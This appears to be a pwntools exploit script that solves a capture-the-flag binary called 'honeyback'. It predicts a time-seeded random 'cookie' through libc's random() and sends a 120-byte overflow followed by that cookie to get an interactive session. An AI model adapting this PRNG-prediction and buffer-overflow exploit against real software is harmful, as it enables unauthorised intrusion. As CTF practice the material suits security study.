# -*- coding: utf-8 -*-
# @Author: m4drat
# @Date:   2019-07-27 00:17:08

import ctypes
from pwn import *

local = True

if local:
    ps = process('../sources/honeyback/Debug/honeyback')
else:
    ps = remote('127.0.0.1', 9007)

LIBC = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    
def generate_cookie(call_cnt):
    '''
    long int generate_cookie()
    {
        call_cnt++;
        // will generate same cookie, so you need to guess (or calculate) just 1 byte.
        char *iv = calloc(260, sizeof(char));
        strncpy(iv, "L>t_sKd>H[j\"A<P0>O\rDPaPb<$t!Q)|FcK|Sj\n=)FYUcrw&T2\rIT&\n4^CT{lCXxX3ru&\'5=FA64V\"rq.2=r9\x0bI\x0b\'kta/RAD@Z]z~0O%ccV!6|l4^_oQHY}j?vsM\rtsbX}PpVDN,]N{,4PC`|!O&|9xzO\n.a&BFHPKmr(5OL\"1j{G}Xc!$bHF$Awt<P|6f\r^qr{kDzjgv\\nPPOY~I\']^nDt\rJ{B-Q1<S\'ccW\\[|@JbAN/c\nGB:GlxLjLw\'viRKl*-", 256);
        initstate(time(NULL) + call_cnt, iv, 256);
        srandom(time(NULL) + call_cnt);
        return random();
    }

    User *user = (User *)malloc(sizeof(User));
    *((char *)&(user->cookie) + 0) = generate_cookie() & 0x00;
    *((char *)&(user->cookie) + 1) = generate_cookie() & 0xff;
    *((char *)&(user->cookie) + 2) = generate_cookie() & 0xff;
    *((char *)&(user->cookie) + 3) = generate_cookie() & 0xff;
    saved_cookie = user->cookie;

    '''
    str_ptr = ctypes.c_char_p(b"L>t_sKd>H[j\"A<P0>O\rDPaPb<$t!Q)|FcK|Sj\n=)FYUcrw&T2\rIT&\n4^CT{lCXxX3ru&\'5=FA64V\"rq.2=r9\x0bI\x0b\'kta/RAD@Z]z~0O%ccV!6|l4^_oQHY}j?vsM\rtsbX}PpVDN,]N{,4PC`|!O&|9xzO\n.a&BFHPKmr(5OL\"1j{G}Xc!$bHF$Awt<P|6f\r^qr{kDzjgv\\nPPOY~I\']^nDt\rJ{B-Q1<S\'ccW\\[|@JbAN/c\nGB:GlxLjLw\'viRKl*-")

    LIBC.initstate(LIBC.time(0) + call_cnt, str_ptr, 256)
    LIBC.srandom(LIBC.time(0) + call_cnt)
    return LIBC.random()


def main():
    cookie = [generate_cookie(i) & 0xff for i in range(1, 5)]
    print('\\x' + '\\x'.join([hex(i)[2:].rjust(2, '0') for i in cookie]))

    # gdb.attach(ps)
    ps.recv()
    ps.sendline('madrat')
    ps.recv()
    ps.sendline('sell')
    ps.recv()    
    ps.sendline('2')
    ps.recv()
    ps.sendline('buy')
    ps.recv()
    ps.sendline('2')
    ps.recv()
    ps.sendline('change')
    ps.recv()
    ps.sendline('2')
    ps.recv()
    print('cookie bytes:' + p32(cookie[3] << 24 | cookie[2] << 16 | cookie[1] << 8 | cookie[0]))
    ps.sendline('A' * 120 + p32(cookie[3] << 24 | cookie[2] << 16 | cookie[1] << 8 | cookie[0]))
    ps.interactive()
    # aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaab

if __name__ == "__main__":
    main()